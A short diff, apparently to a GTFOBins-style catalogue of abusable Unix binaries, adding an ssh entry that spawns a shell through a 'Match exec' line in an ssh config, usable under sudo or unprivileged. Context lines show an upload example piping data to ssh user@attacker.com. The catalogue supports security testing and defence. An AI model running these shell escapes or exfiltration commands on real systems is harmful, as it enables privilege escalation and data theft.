@@ -38,6 +38,13 @@ functions:
     contexts:
       sudo:
       unprivileged:
+  - code: |-
+      echo 'Match exec "/bin/sh 0<&2 1>&2"' > "$HOME/.ssh/config"; ssh -F ~/.ssh/config localhost
+    comment: |-
+      Spawns the shell on the client, doesn't have to be the official config file location
+    contexts:
+      sudo:
+      unprivileged:       
   upload:
   - code: |-
       echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
